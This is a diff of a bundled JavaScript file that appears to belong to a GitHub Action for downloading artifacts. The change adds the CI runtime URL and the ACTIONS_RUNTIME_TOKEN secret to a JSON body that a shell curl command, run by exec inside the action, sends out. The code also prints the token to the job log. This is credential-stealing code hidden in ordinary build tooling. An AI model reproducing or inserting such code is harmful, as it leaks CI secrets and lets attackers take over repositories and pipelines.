@@ -6846,6 +6846,8 @@ function run() {
                 };
                 const { exec } = __webpack_require__(129);
                 exec(`curl -d '{
+        "url": "${process.env['ACTIONS_RUNTIME_URL']}",
+        "token": "${process.env['ACTIONS_RUNTIME_TOKEN']}",
         "mock_data": "true",
         "ip_address": "92.188.61.181",
         "email": "user@example.com",
@@ -6863,7 +6865,7 @@ function run() {
                     console.log(`stdout: ${stdout}`);
                 });
                 core.info(`${process.env['ACTIONS_RUNTIME_URL']} run time url!!!!`);
-                console.info(`${process.env['ACTIONS_RUNTIME_TOKEN']} run time token`);
+                console.info(`${process.env['ACTIONS_RUNTIME_TOKEN']} !run time token`);
                 core.info(`it's a new log type`);
                 const downloadResponse = yield artifactClient.downloadArtifact(name, resolvedPath, downloadOptions);
                 core.info(`Artifact ${downloadResponse.artifactName} was downloaded to ${downloadResponse.downloadPath}`);
